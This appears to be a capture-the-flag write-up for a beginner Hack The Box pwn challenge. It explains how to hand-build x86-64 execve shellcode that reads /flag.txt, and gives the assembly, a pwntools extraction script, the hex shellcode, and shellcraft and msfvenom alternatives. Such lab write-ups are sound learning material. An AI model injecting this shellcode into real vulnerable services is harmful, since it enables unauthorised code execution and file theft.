---
platform: htb
category: pwn
difficulty: very easy
date: 2026-11-15
---
# Assembly training exercise 

---
## Context
We were given a server that simulates an exploitable server we can execute shellcodes on. Using one of the tools learned during the course, we should connect to the server using `netcat` and then print the content of `/flag.txt`.  

## Goal
The goal is to create or obtain a shellcode that can print the content of `/flag.txt` and retrieve the flag. 

## Walkthrough
In this situation, I had two main options : creating my own shellcode using the `execve` syscall or generating it using `shellcraft` or `msfvenom`. 

I wanted to continue practicing assembly so I decided to do it myself.

So, first, we need to code in assembly a binary using the `execve` syscall that will execute the following shell command :
```bash
cat /flag.txt
```

Furthermore, the prototype of `execve` is :
```c
int execve(const char *path, char *const _Nullable argv[], char *const _Nullable envp[]);
```

1. `path` -> This is a string with the path to the binary we want to execute, in our case `/bin/cat`;
2. `argv[]` -> This is an array of pointers to the strings passed to the new program, and the array must be terminated by a NULL pointer. In our case this is `['/bin/cat', '/flag.txt', NULL]`;
3. `envp` -> This is an array of pointers to the environment variables we want to pass to the program, and it should also end with a NULL pointer. In our case we don’t need any specific environment variable, so we just put `NULL`.

Thus, the syscall should look like : 
```c
//This is a representative notation, not the real one in C
execve('/bin/cat', ['/bin/cat', '/flag.txt', NULL], NULL)
```

Since a shellcode can't rely on variables, the two strings have to be built directly on the stack. The idea is to push each string onto the stack byte by byte, and then save its address in a register. This way the strings live in memory without any variable, and we can still refer to them through their addresses.

Once both strings are in place and their addresses are saved, we build the `argv` array. Because the stack grows downward, we push its elements in reverse order: first the NULL terminator, then the address of `/flag.txt` (`argv[1]`), then the address of `/bin/cat` (`argv[0]`). Finally, `rsp` points to the start of this array, which we move into `rsi`.

Now, our code is ready to be executed. First we assemble it into a binary, then we use pwntools to turn that binary into a shellcode and run it.

---
## Solution
The assembly code is the following: 
```asm
global _start

section .text
_start:
	xor rax, rax           ;rax = 0
	mov al, 59             ;storing the execve syscall number
	xor rdx, rdx           ;rdx = 0, it will be reused as NULL later

	; build the "/bin/cat" string on the stack
	push rdx 
	mov rdi, '/bin/cat'
	push rdi
	mov rdi, rsp           ; rdi now stores the address of '/bin/cat'

	;build the "/flag.txt" string (9 bytes, pushed in two parts)
	push rdx               ;NULL terminator
	xor rbx, rbx
	mov bl, 't'
	push rbx
	mov rbx, '/flag.tx'
	push rbx
	mov r8, rsp             ; r8 stores the address

	;build argv 
	push rdx            ;array NULL terminator
	push r8             ;argv[1] = address of "/flag.txt"
	push rdi            ;argv[0] = address of "/bin/cat"
	mov rsi, rsp        ;rsi points to argv

	syscall
```

The Python script used to extract the shellcode from a binary file is: 
```python
import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())
```

The resulting shellcode is : `4831c0b03b4831d25248bf2f62696e2f636174574889e7524831dbb3745348bb2f666c61672e7478534989e0524150574889e60f05`.

---
## Result
With the shellcode in our hands, we can inject it into the remote server and find the flag hidden in `/flag.txt`, which is: 
- `HTB{r3m073_...}`
---
## Beyond the solution 
Another option was to generate a shellcode using either shellcraft or 
msfvenom. 

Here is an example for shellcraft :
```bash
pwn shellcraft amd64.linux.cat /flag.txt
```

Here is an example for msfvenom :
```bash
msfvenom -p 'linux/x64/exec' CMD='cat /flag.txt' -a x64 --platform linux -f hex
```

---
## Takeaways
I struggled a lot to understand that we first need to push the strings onto the stack in order to use their addresses afterward. At the beginning it was quite hard not to use the strings directly rather than their addresses.

But in the end, I now have a clearer understanding of how we avoid using variables, and how, without variables, we can still work with addresses when needed.